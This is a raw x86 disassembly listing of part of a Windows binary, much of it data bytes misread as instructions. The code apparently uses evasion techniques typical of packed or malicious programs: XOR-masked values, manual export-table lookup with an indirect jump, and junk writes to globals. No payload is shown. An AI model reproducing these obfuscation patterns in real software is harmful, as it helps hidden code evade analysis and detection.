  421b9f:	mov    eax,0x638d916b
  421ba4:	xchg   ecx,eax
  421ba5:	adc    BYTE PTR [ebx+0x15121c2b],cl
  421bab:	or     DWORD PTR [ecx-0x18],edx
  421bae:	loope  0x421c03
  421bb0:	cmp    DWORD PTR [ecx+0x4e],eax
  421bb3:	pop    esi
  421bb4:	mov    cl,0x64
  421bb6:	inc    esi
  421bb7:	js     0x421b60
  421bb9:	add    ebp,esp
  421bbb:	inc    ecx
  421bbc:	mov    dh,0xdd
  421bbe:	or     edx,DWORD PTR [edi-0x51]
  421bc1:	inc    ebp
  421bc2:	inc    ebp
  421bc3:	adc    DWORD PTR [edx],edi
  421bc5:	mov    BYTE PTR [edx+0x70628cdf],ch
  421bcb:	pop    esp
  421bcc:	rcr    BYTE PTR [eax-0x1d03fd13],0xfd
  421bd3:	cmp    dl,cl
  421bd5:	cmc    
  421bd6:	xor    edx,DWORD PTR [edx+edi*1]
  421bd9:	adc    BYTE PTR [ebx-0x6bd74018],0xf4
  421be0:	fs xchg cl,bh
  421be3:	loope  0x421c3e
  421be5:	xor    ah,BYTE PTR fs:[edx-0x58]
  421be9:	add    BYTE PTR [edx+0x7a8d4b2b],ah
  421bef:	aad    0xb3
  421bf1:	cmp    al,0xce
  421bf3:	mov    esp,esp
  421bf5:	xchg   ebp,eax
  421bf6:	mov    edi,0xef13c96a
  421bfb:	call   0x955a:0x2a29cf4c
  421c02:	and    DWORD PTR [ebx-0x2b1e3462],ecx
  421c08:	(bad)  
  421c09:	xchg   edx,eax
  421c0a:	lods   eax,DWORD PTR ds:[esi]
  421c0b:	loop   0x421b91
  421c0d:	adc    DWORD PTR [esi+0x3c],edi
  421c10:	call   0x339:0xd08bcb24
  421c17:	pushf  
  421c18:	mov    eax,ds:0xdc2915b
  421c1d:	pushf  
  421c1e:	sub    al,0x95
  421c20:	retf   
  421c21:	dec    edx
  421c22:	dec    ebp
  421c23:	outs   dx,DWORD PTR ds:[esi]
  421c24:	retf   
  421c25:	les    ebx,FWORD PTR [ebx+ebp*4+0x14fe739]
  421c2c:	add    al,0xfa
  421c2e:	dec    edx
  421c2f:	popf   
  421c30:	push   es
  421c31:	in     eax,0x49
  421c33:	nop
  421c34:	in     al,0xac
  421c36:	mov    esp,0x98b78ad9
  421c3b:	test   DWORD PTR [ecx+eax*1],ebx
  421c3e:	ins    DWORD PTR es:[edi],dx
  421c3f:	jp     0x421c17
  421c41:	loop   0x421bd5
  421c43:	sub    BYTE PTR [edx],dh
  421c45:	jge    0x421c95
  421c47:	dec    ebp
  421c48:	xor    al,0xa
  421c4a:	jno    0x421cc3
  421c4c:	outs   dx,DWORD PTR ds:[esi]
  421c4d:	sub    ebp,ecx
  421c4f:	sbb    BYTE PTR [esi],dl
  421c51:	outs   dx,DWORD PTR ds:[esi]
  421c52:	push   eax
  421c53:	adc    eax,0x7dbf2fcc
  421c58:	mov    ds:0xaf6c77c,al
  421c5d:	push   ebx
  421c5e:	mov    cl,0xa0
  421c60:	xchg   ebx,eax
  421c61:	lahf   
  421c62:	retw   0xc638
  421c66:	fist   DWORD PTR [ecx-0x12]
  421c69:	pop    es
  421c6a:	add    bh,BYTE PTR [esp+edx*1]
  421c6d:	mov    eax,ds:0xfef1bea2
  421c72:	fstp   TBYTE PTR [ecx]
  421c74:	dec    esp
  421c75:	(bad)  
  421c77:	jmp    0x8ce8:0x219f7c63
  421c7e:	lock mov eax,0x4eaf79da
  421c84:	call   0xbe767a17
  421c89:	aas    
  421c8a:	adc    eax,0xdab8b0a
  421c8f:	idiv   esp
  421c91:	bound  edi,QWORD PTR [edx+edx*1-0x73]
  421c95:	jle    0x421c29
  421c97:	cmp    eax,0x1297828f
  421c9c:	popf   
  421c9d:	idiv   BYTE PTR cs:[ebx-0x2]
  421ca1:	inc    edi
  421ca2:	dec    esi
  421ca3:	inc    DWORD PTR [ebx]
  421ca5:	mov    ch,0x8
  421ca7:	(bad)  
  421ca8:	(bad)  
  421ca9:	dec    DWORD PTR [ecx-0x1f74b]
  421caf:	dec    DWORD PTR [ebx-0x1e77b]
  421cb5:	(bad)  
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421dc5
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421d7b
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x31b790cd
  421d18:	rcl    DWORD PTR [eax-0x413f36c8],cl
  421d1e:	addr16 mov esi,0xa96fbebe
  421d24:	adc    esp,eax
  421d26:	mov    esp,0x88e8a5e8
  421d2b:	(bad)  
  421d2c:	add    BYTE PTR [esp+ecx*2-0x2a8c11d5],dh
  421d33:	xchg   DWORD PTR [edi],esp
  421d35:	ret    
  421d36:	xor    al,0xcc
  421d38:	and    eax,0xce897c5c
  421d3d:	mov    esp,0xe1693afb
  421d42:	test   DWORD PTR [ecx+0x28],0x29c12d7a
  421d49:	scas   al,BYTE PTR es:[edi]
  421d4a:	(bad)  
  421d4b:	push   0xb9db4529
  421d50:	dec    esp
  421d51:	retf   0x5add
  421d54:	xchg   ebx,eax
  421d55:	fnsave [ebp+0x5cfba335]
  421d5b:	fstp   QWORD PTR [eax+0x1b]
  421d5e:	and    BYTE PTR [eax],cl
  421d60:	jbe    0x421dcd
  421d62:	or     DWORD PTR [esp+ebp*1+0x9],esp
  421d66:	in     al,dx
  421d67:	clc    
  421d68:	sti    
  421d69:	pop    edx
  421d6a:	sub    eax,DWORD PTR [esi]
  421d6c:	pop    esi
  421d6d:	mov    dh,0xcd
  421d6f:	ror    DWORD PTR [eax-0x60],cl
  421d72:	xor    al,0xd2
  421d74:	mov    esi,ebx
  421d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d77:	sahf   
  421d78:	fsub   QWORD PTR [ecx]
  421d7a:	push   esi
  421d7b:	mov    eax,DWORD PTR [ebp-0x1f8]
  421d81:	mov    ecx,DWORD PTR [ebp-0x20c]
  421d87:	movzx  eax,WORD PTR [ecx+eax*4]
  421d8b:	xor    eax,0xa59b
  421d90:	movzx  eax,ax
  421d93:	sar    eax,1
  421d95:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421d9b:	mov    edx,DWORD PTR [ebp-0x20c]
  421da1:	movzx  ecx,WORD PTR [edx+ecx*4]
  421da5:	xor    ecx,0xa59b
  421dab:	movzx  ecx,cx
  421dae:	shl    ecx,0xf
  421db1:	or     eax,ecx
  421db3:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421db9:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421dc0:	jmp    0x421879
  421dc5:	mov    eax,DWORD PTR [ebp-0x1f0]
  421dcb:	mov    edx,DWORD PTR [ebp-0x1ec]
  421dd1:	xor    eax,0xcb79b576
  421dd6:	xor    edx,0x9c2b8ae8
  421ddc:	mov    cl,0x2
  421dde:	call   0x408bb8
  421de3:	mov    esi,eax
  421de5:	mov    edi,edx
  421de7:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ded:	mov    edx,DWORD PTR [ebp-0x1ec]
  421df3:	xor    eax,0xcb79b576
  421df8:	xor    edx,0x9c2b8ae8
  421dfe:	mov    cl,0x3e
  421e00:	call   0x422394
  421e05:	or     esi,eax
  421e07:	or     edi,edx
  421e09:	mov    DWORD PTR [ebp-0x1e4],esi
  421e0f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e15:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e1b:	xor    eax,0xcb79b576
  421e20:	xor    edx,0x9c2b8ae8
  421e26:	mov    cl,0x2
  421e28:	call   0x408bb8
  421e2d:	mov    esi,eax
  421e2f:	mov    edi,edx
  421e31:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e37:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e3d:	xor    eax,0xcb79b576
  421e42:	xor    edx,0x9c2b8ae8
  421e48:	mov    cl,0x3e
  421e4a:	call   0x422394
  421e4f:	or     esi,eax
  421e51:	or     edi,edx
  421e53:	mov    DWORD PTR [ebp-0x23c],esi
  421e59:	mov    DWORD PTR [ebp-0x238],edi
  421e5f:	mov    eax,DWORD PTR [ebp-0x23c]
  421e65:	or     eax,DWORD PTR [ebp-0x238]
  421e6b:	je     0x4220cb
  421e71:	lea    eax,[ebp-0x204]
  421e77:	mov    DWORD PTR [ebp-0x208],eax
  421e7d:	mov    eax,DWORD PTR [ebp-0x1e4]
  421e83:	xor    edx,edx
  421e85:	mov    cl,0x2
  421e87:	call   0x422394
  421e8c:	mov    esi,eax
  421e8e:	mov    edi,edx
  421e90:	mov    eax,DWORD PTR [ebp-0x1e4]
  421e96:	xor    edx,edx
  421e98:	mov    cl,0x3e
  421e9a:	call   0x408bb8
  421e9f:	or     esi,eax
  421ea1:	or     edi,edx
  421ea3:	xor    esi,0xcb79b576
  421ea9:	xor    edi,0x9c2b8ae8
  421eaf:	mov    eax,DWORD PTR [ebp-0x208]
  421eb5:	mov    DWORD PTR [eax],esi
  421eb7:	mov    DWORD PTR [eax+0x4],edi
  421eba:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ec0:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421ec8:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ece:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ed4:	xor    eax,0xcb79b576
  421ed9:	xor    edx,0x9c2b8ae8
  421edf:	mov    cl,0x2
  421ee1:	call   0x408bb8
  421ee6:	mov    ebx,eax
  421ee8:	mov    edi,edx
  421eea:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ef0:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ef6:	xor    eax,0xcb79b576
  421efb:	xor    edx,0x9c2b8ae8
  421f01:	mov    cl,0x3e
  421f03:	call   0x422394
  421f08:	or     ebx,eax
  421f0a:	or     edi,edx
  421f0c:	movsx  eax,bl
  421f0f:	cmp    esi,eax
  421f11:	je     0x422071
  421f17:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f1d:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f25:	mov    eax,DWORD PTR [ebp-0x204]
  421f2b:	mov    edx,DWORD PTR [ebp-0x200]
  421f31:	xor    eax,0xcb79b576
  421f36:	xor    edx,0x9c2b8ae8
  421f3c:	mov    cl,0x2
  421f3e:	call   0x408bb8
  421f43:	mov    edi,eax
  421f45:	mov    ebx,edx
  421f47:	mov    eax,DWORD PTR [ebp-0x204]
  421f4d:	mov    edx,DWORD PTR [ebp-0x200]
  421f53:	xor    eax,0xcb79b576
  421f58:	xor    edx,0x9c2b8ae8
  421f5e:	mov    cl,0x3e
  421f60:	call   0x422394
  421f65:	or     edi,eax
  421f67:	or     ebx,edx
  421f69:	mov    eax,DWORD PTR [ebp-0x210]
  421f6f:	movsx  eax,BYTE PTR [eax+edi*1]
  421f73:	cmp    esi,eax
  421f75:	je     0x421f85
  421f7b:	jmp    0x4220cb
  421f80:	jmp    0x422071
  421f85:	mov    eax,DWORD PTR [ebp-0x204]
  421f8b:	mov    edx,DWORD PTR [ebp-0x200]
  421f91:	xor    eax,0xcb79b576
  421f96:	xor    edx,0x9c2b8ae8
  421f9c:	mov    cl,0x2
  421f9e:	call   0x408bb8
  421fa3:	mov    esi,eax
  421fa5:	mov    edi,edx
  421fa7:	mov    eax,DWORD PTR [ebp-0x204]
  421fad:	mov    edx,DWORD PTR [ebp-0x200]
  421fb3:	xor    eax,0xcb79b576
  421fb8:	xor    edx,0x9c2b8ae8
  421fbe:	mov    cl,0x3e
  421fc0:	call   0x422394
  421fc5:	or     esi,eax
  421fc7:	or     edi,edx
  421fc9:	mov    eax,DWORD PTR [ebp-0x210]
  421fcf:	movsx  esi,BYTE PTR [eax+esi*1]
  421fd3:	mov    eax,DWORD PTR [ebp-0x1f0]
  421fd9:	mov    edx,DWORD PTR [ebp-0x1ec]
  421fdf:	xor    eax,0xcb79b576
  421fe4:	xor    edx,0x9c2b8ae8
  421fea:	mov    cl,0x2
  421fec:	call   0x408bb8
  421ff1:	mov    ebx,eax
  421ff3:	mov    edi,edx
  421ff5:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ffb:	mov    edx,DWORD PTR [ebp-0x1ec]
  422001:	xor    eax,0xcb79b576
  422006:	xor    edx,0x9c2b8ae8
  42200c:	mov    cl,0x3e
  42200e:	call   0x422394
  422013:	or     ebx,eax
  422015:	or     edi,edx
  422017:	movsx  eax,bl
  42201a:	cmp    esi,eax
  42201c:	jne    0x422071
  422022:	mov    eax,DWORD PTR [ebp-0x1e0]
  422028:	mov    edx,DWORD PTR [ebp-0x1dc]
  42202e:	xor    eax,0xcb79b576
  422033:	xor    edx,0x9c2b8ae8
  422039:	mov    cl,0x2
  42203b:	call   0x408bb8
  422040:	mov    esi,eax
  422042:	mov    edi,edx
  422044:	mov    eax,DWORD PTR [ebp-0x1e0]
  42204a:	mov    edx,DWORD PTR [ebp-0x1dc]
  422050:	xor    eax,0xcb79b576
  422055:	xor    edx,0x9c2b8ae8
  42205b:	mov    cl,0x3e
  42205d:	call   0x422394
  422062:	or     esi,eax
  422064:	or     edi,edx
  422066:	mov    DWORD PTR [ebp-0x214],esi
  42206c:	jmp    0x422115
  422071:	mov    eax,DWORD PTR [ebp-0x1e0]
  422077:	mov    edx,DWORD PTR [ebp-0x1dc]
  42207d:	xor    eax,0xcb79b576
  422082:	xor    edx,0x9c2b8ae8
  422088:	mov    cl,0x2
  42208a:	call   0x408bb8
  42208f:	mov    esi,eax
  422091:	mov    edi,edx
  422093:	mov    eax,DWORD PTR [ebp-0x1e0]
  422099:	mov    edx,DWORD PTR [ebp-0x1dc]
  42209f:	xor    eax,0xcb79b576
  4220a4:	xor    edx,0x9c2b8ae8
  4220aa:	mov    cl,0x3e
  4220ac:	call   0x422394
  4220b1:	or     esi,eax
  4220b3:	or     edi,edx
  4220b5:	add    esi,DWORD PTR [ebp-0x1e4]
  4220bb:	mov    DWORD PTR [ebp-0x1e4],esi
  4220c1:	jmp    0x421e0f
  4220c6:	jmp    0x421e0f
  4220cb:	mov    eax,DWORD PTR [ebp-0x1f0]
  4220d1:	mov    edx,DWORD PTR [ebp-0x1ec]
  4220d7:	xor    eax,0xcb79b576
  4220dc:	xor    edx,0x9c2b8ae8
  4220e2:	mov    cl,0x2
  4220e4:	call   0x408bb8
  4220e9:	mov    esi,eax
  4220eb:	mov    edi,edx
  4220ed:	mov    eax,DWORD PTR [ebp-0x1f0]
  4220f3:	mov    edx,DWORD PTR [ebp-0x1ec]
  4220f9:	xor    eax,0xcb79b576
  4220fe:	xor    edx,0x9c2b8ae8
  422104:	mov    cl,0x3e
  422106:	call   0x422394
  42210b:	or     esi,eax
  42210d:	or     edi,edx
  42210f:	mov    DWORD PTR [ebp-0x214],esi
  422115:	mov    eax,DWORD PTR [ebp-0x214]
  42211b:	mov    DWORD PTR [ebp-0xc8],eax
  422121:	cmp    DWORD PTR [ebp-0xc8],0x0
  422128:	je     0x422152
  42212e:	mov    eax,DWORD PTR [ebp-0x144]
  422134:	mov    ecx,DWORD PTR [ebp-0xac]
  42213a:	movzx  eax,WORD PTR [ecx+eax*2]
  42213e:	mov    ecx,DWORD PTR [ebp-0xa8]
  422144:	mov    eax,DWORD PTR [ecx+eax*4]
  422147:	mov    DWORD PTR [ebp-0xfc],eax
  42214d:	jmp    0x422157
  422152:	jmp    0x420789
  422157:	cmp    DWORD PTR [ebp-0xfc],0x0
  42215e:	jne    0x42216b
  422164:	xor    eax,eax
  422166:	jmp    0x42238d
  42216b:	mov    eax,DWORD PTR [ebp+0x8]
  42216e:	add    eax,DWORD PTR [ebp-0xfc]
  422174:	mov    DWORD PTR [ebp-0xec],eax
  42217a:	mov    DWORD PTR [ebp-0x74],0x0
  422181:	cmp    DWORD PTR [ebp-0xb0],0x0
  422188:	je     0x422204
  42218e:	cmp    DWORD PTR [ebp-0xb0],0x0
  422195:	je     0x422204
  42219b:	mov    eax,DWORD PTR [ebp-0xb0]
  4221a1:	shl    eax,0x2
  4221a4:	mov    DWORD PTR [ebp-0x74],eax
  4221a7:	mov    DWORD PTR [ebp-0x14c],0x0
  4221b1:	sub    esp,DWORD PTR [ebp-0x74]
  4221b4:	mov    DWORD PTR [ebp-0x14c],esp
  4221ba:	mov    DWORD PTR [ebp-0x148],0x0
  4221c4:	mov    eax,DWORD PTR [ebp-0x148]
  4221ca:	cmp    eax,DWORD PTR [ebp-0xb0]
  4221d0:	je     0x422204
  4221d6:	mov    eax,DWORD PTR [ebp-0x148]
  4221dc:	mov    ecx,DWORD PTR [ebp-0x14c]
  4221e2:	mov    edx,DWORD PTR [ebp-0x148]
  4221e8:	mov    esi,DWORD PTR [ebp+0x14]
  4221eb:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  4221ef:	mov    DWORD PTR [ecx+eax*4],edx
  4221f2:	mov    eax,DWORD PTR [ebp-0x148]
  4221f8:	inc    eax
  4221f9:	mov    DWORD PTR [ebp-0x148],eax
  4221ff:	jmp    0x4221c4
  422204:	mov    DWORD PTR [ebp-0x9c],0x0
  42220e:	push   0x422346
  422213:	jmp    DWORD PTR [ebp-0xec]
  422219:	mov    eax,eax
  42221b:	mov    ecx,esp
  42221d:	ret    0x8
  422220:	cmp    DWORD PTR ds:0x4283a5,0x0
  422227:	not    DWORD PTR ds:0x4283a5
  42222d:	mov    DWORD PTR ds:0x4283bd,0x5307
  422237:	mov    DWORD PTR ds:0x428515,0x4819
  422241:	jmp    0x422283
  422246:	not    eax
  422248:	cmp    DWORD PTR ds:0x4283a5,0x0
  42224f:	jl     0x422271
  422255:	push   0x0
  422257:	call   DWORD PTR ds:0x42e13c
  42225d:	add    DWORD PTR ds:0x428495,0x4c21
  422267:	and    DWORD PTR ds:0x42847d,0x73e0
  422271:	sub    DWORD PTR ds:0x4283e9,edx
  422277:	or     DWORD PTR ds:0x4282f1,ecx
  42227d:	sub    DWORD PTR ds:0x42848d,ebx
  422283:	push   ebx
  422284:	dec    eax
  422285:	push   esi
  422286:	mov    eax,DWORD PTR [esp+0x18]
  42228a:	or     eax,eax
  42228c:	mov    DWORD PTR ds:0x4283ad,0x72ef
  422296:	jne    0x4222d2
  42229c:	mov    ecx,DWORD PTR [esp+0x14]
  4222a0:	mov    eax,DWORD PTR [esp+0x10]
  4222a4:	xor    edx,edx
  4222a6:	inc    ebx
  4222a7:	div    ecx
  4222a9:	sbb    ebx,DWORD PTR ds:0x4284f9
  4222af:	mov    ebx,eax
  4222b1:	mov    eax,DWORD PTR [esp+0xc]
  4222b5:	adc    DWORD PTR ds:0x42847d,0x42840d
  4222bf:	div    ecx
  4222c1:	mov    DWORD PTR ds:0x4283a5,0x3a7e
  4222cb:	mov    edx,ebx
  4222cd:	jmp    0x422341
  4222d2:	mov    ecx,eax
  4222d4:	mov    ebx,DWORD PTR [esp+0x14]
  4222d8:	xor    eax,DWORD PTR ds:0x428519
  4222de:	mov    edx,DWORD PTR [esp+0x10]
  4222e2:	mov    eax,DWORD PTR [esp+0xc]
  4222e6:	mov    DWORD PTR ds:0x428415,0x7dde
  4222f0:	shr    ecx,1
  4222f2:	mov    DWORD PTR ds:0x428505,0x121c
  4222fc:	rcr    ebx,1
  4222fe:	shr    edx,1
  422300:	rcr    eax,1
  422302:	or     ecx,ecx
  422304:	jne    0x4222e6
  42230a:	div    ebx
  42230c:	mov    esi,eax
  42230e:	mul    DWORD PTR [esp+0x18]
  422312:	mov    ecx,eax
  422314:	mov    eax,DWORD PTR [esp+0x14]
  422318:	mul    esi
  42231a:	add    edx,ecx
  42231c:	jb     0x42233c
  422322:	cmp    edx,DWORD PTR [esp+0x10]
  422326:	ja     0x42233c
  42232c:	jb     0x42233d
  422332:	cmp    eax,DWORD PTR [esp+0xc]
  422336:	jbe    0x42233d
  42233c:	dec    esi
  42233d:	xor    edx,edx
  42233f:	mov    eax,esi
  422341:	pop    esi
  422342:	pop    ebx
  422343:	ret    0x10
  422346:	sub    DWORD PTR [ebp+0x10],0x1
  42234a:	mov    DWORD PTR ds:0x428481,0x3767
  422354:	cmp    DWORD PTR [ebp+0x10],0x0
  422358:	mov    DWORD PTR ds:0x428509,0xcef
  422362:	je     0x422377
  422368:	mov    esi,DWORD PTR ds:0x428499
  42236e:	sbb    DWORD PTR ds:0x428505,esi
  422374:	add    esp,DWORD PTR [ebp-0x74]
  422377:	mov    DWORD PTR [ebp-0x9c],eax
  42237d:	mov    eax,DWORD PTR [ebp-0x9c]
  422383:	mov    DWORD PTR ds:0x4283d1,0x5e8f
  42238d:	pop    edi
  42238e:	pop    esi
  42238f:	pop    ebx
  422390:	leave  
  422391:	ret    0x10
  422394:	cmp    cl,0x40
  422397:	mov    DWORD PTR ds:0x4283d5,0x7c93
  4223a1:	jae    0x4223e1
  4223a7:	cmp    cl,0x20
  4223aa:	mov    DWORD PTR ds:0x428311,0x440e
  4223b4:	jae    0x4223c0
  4223ba:	shld   edx,eax,cl
  4223bd:	shl    eax,cl
  4223bf:	ret    
  4223c0:	movzx  edx,WORD PTR ds:0x428465
  4223c7:	add    DWORD PTR ds:0x428415,edx
  4223cd:	mov    edx,eax
  4223cf:	xor    eax,eax
  4223d1:	mov    DWORD PTR ds:0x428301,0x5f4f
  4223db:	and    cl,0x1f
  4223de:	shl    edx,cl
  4223e0:	ret    
  4223e1:	xor    eax,eax
  4223e3:	xor    edx,edx
  4223e5:	ret    
	...
  4223ee:	add    BYTE PTR [eax],al
  4223f0:	add    al,0x73
  4223f2:	xchg   ecx,ebp
  4223f4:	push   ebx
  4223f5:	into   
  4223f6:	jns    0x422459
  4223f8:	push   0x98626f72
  4223fd:	xor    eax,0x74b9d761
  422402:	jne    0x422472
  422404:	and    dl,bl
  422406:	mov    ch,0xed
  422408:	popf   
  422409:	bnd ret 0xa4
  42240d:	add    BYTE PTR [eax],al
  42240f:	add    BYTE PTR [edi+0x72],ah
  422412:	gs popa 
  422414:	je     0x42247d
  422416:	jb     0x42247d
  422418:	popa   
  422419:	je     0x422482
  42241b:	jb     0x422482
  42241d:	popa   
  42241e:	je     0x422487
  422420:	jb     0x422487
  422422:	popa   
  422423:	je     0x42248c
  422425:	jb     0x42248c
  422427:	popa   
  422428:	je     0x422491
  42242a:	jb     0x422491
  42242c:	popa   
  42242d:	je     0x422496
  42242f:	jb     0x422496
  422431:	popa   
  422432:	je     0x42249b
  422434:	jb     0x42249b
  422436:	popa   
  422437:	je     0x4224a0
  422439:	jb     0x4224a0
  42243b:	popa   
  42243c:	je     0x4224a5
  42243e:	jb     0x4224a5
  422440:	popa   
  422441:	je     0x422443
  422443:	add    BYTE PTR [eax+0x65],ch
  422446:	ins    BYTE PTR es:[edi],dx
  422447:	ins    BYTE PTR es:[edi],dx
  422448:	push   0x686c6c65
  42244d:	gs ins BYTE PTR es:[edi],dx
  42244f:	ins    BYTE PTR es:[edi],dx
  422450:	push   0x686c6c65
  422455:	gs ins BYTE PTR es:[edi],dx
  422457:	ins    BYTE PTR es:[edi],dx
  422458:	push   0x686c6c65
  42245d:	gs ins BYTE PTR es:[edi],dx
  42245f:	ins    BYTE PTR es:[edi],dx
  422460:	push   0x686c6c65
  422465:	gs ins BYTE PTR es:[edi],dx
  422467:	ins    BYTE PTR es:[edi],dx
  422468:	push   0x686c6c65
  42246d:	gs ins BYTE PTR es:[edi],dx
  42246f:	ins    BYTE PTR es:[edi],dx
  422470:	push   0x686c6c65
  422475:	gs ins BYTE PTR es:[edi],dx
  422477:	ins    BYTE PTR es:[edi],dx
  422478:	add    BYTE PTR [eax],al
  42247a:	add    BYTE PTR [eax],al
  42247c:	outs   dx,DWORD PTR ds:[esi]
  42247d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422481:	add    BYTE PTR [ecx+0x0],ah
  422484:	jne    0x422486
  422486:	je     0x422488
  422488:	xor    eax,DWORD PTR [eax]
  42248a:	xor    al,BYTE PTR [eax]
  42248c:	add    BYTE PTR [eax],al
  42248e:	add    BYTE PTR [eax],al
  422490:	push   0x61006500
  422495:	add    BYTE PTR [esi+0x0],dh
  422498:	add    BYTE PTR gs:[esi+0x0],ch
  42249c:	push   0x61006500
  4224a1:	add    BYTE PTR [esi+0x0],dh
  4224a4:	add    BYTE PTR gs:[esi+0x0],ch
  4224a8:	push   0x61006500
  4224ad:	add    BYTE PTR [esi+0x0],dh
  4224b0:	add    BYTE PTR gs:[esi+0x0],ch
  4224b4:	push   0x61006500
  4224b9:	add    BYTE PTR [esi+0x0],dh
  4224bc:	add    BYTE PTR gs:[esi+0x0],ch
  4224c0:	push   0x61006500
  4224c5:	add    BYTE PTR [esi+0x0],dh
  4224c8:	add    BYTE PTR gs:[esi+0x0],ch
  4224cc:	push   0x61006500
  4224d1:	add    BYTE PTR [esi+0x0],dh
  4224d4:	add    BYTE PTR gs:[esi+0x0],ch
  4224d8:	push   0x61006500
  4224dd:	add    BYTE PTR [esi+0x0],dh
  4224e0:	add    BYTE PTR gs:[esi+0x0],ch
  4224e4:	push   0x61006500
  4224e9:	add    BYTE PTR [esi+0x0],dh
  4224ec:	add    BYTE PTR gs:[esi+0x0],ch
  4224f0:	push   0x61006500
  4224f5:	add    BYTE PTR [esi+0x0],dh
  4224f8:	add    BYTE PTR gs:[esi+0x0],ch
  4224fc:	add    BYTE PTR [eax],al
  4224fe:	add    BYTE PTR [eax],al
  422500:	jl     0x422526
  422502:	inc    edx
  422503:	add    BYTE PTR [edi+0x6c],cl
  422506:	gs dec ecx
  422508:	arpl   WORD PTR [edi+0x6e],bp
  42250b:	push   esp
  42250c:	outs   dx,DWORD PTR ds:[esi]
  42250d:	inc    ebx
  42250e:	jne    0x422582
  422510:	jae    0x422581
  422512:	jb     0x422514
  422514:	add    al,0x25
  422516:	inc    edx
	...
  42251f:	add    al,al
  422521:	sub    BYTE PTR [edx+0x0],al
  422524:	enter  0x4228,0x0
  422528:	and    BYTE PTR [edi],0x42
  42252b:	add    dl,dh
  42252d:	inc    edx
  42252e:	push   ebx
  42252f:	lea    edx,ds:0x1a59ba5
  422535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422536:	popf   
  422537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422538:	jno    0x4224df
  42253a:	xchg   edi,eax
  42253b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42253c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  422542:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  422549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254a:	mov    ebx,0xd183d3a5
  42254f:	lea    edx,[ebp-0x645aea5b]
  422555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422556:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  42255c:	xchg   edi,eax
  42255d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42255e:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  422564:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  42256b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42256c:	mov    ebx,0xd1e3d3a5
  422571:	in     eax,dx
  422572:	xchg   ebp,eax
  422573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422574:	adc    eax,0x3ba59ba5
  422579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257a:	popf   
  42257b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257c:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  422582:	(bad)  
  422583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422584:	fwait
  422585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422586:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  42258c:	icebp  
  42258d:	sub    eax,0xf172ff7
  422592:	adc    eax,0x3a59109
  422597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422598:	fwait
  422599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259a:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  4225a0:	xchg   ebp,eax
  4225a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225a2:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  4225a8:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  4225af:	or     eax,0x6f170ff7
  4225b4:	adc    eax,0x3a59169
  4225b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ba:	fwait
  4225bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225bc:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  4225c2:	xchg   ebp,eax
  4225c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225c4:	xor    eax,0x9ba58da5
  4225c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ca:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
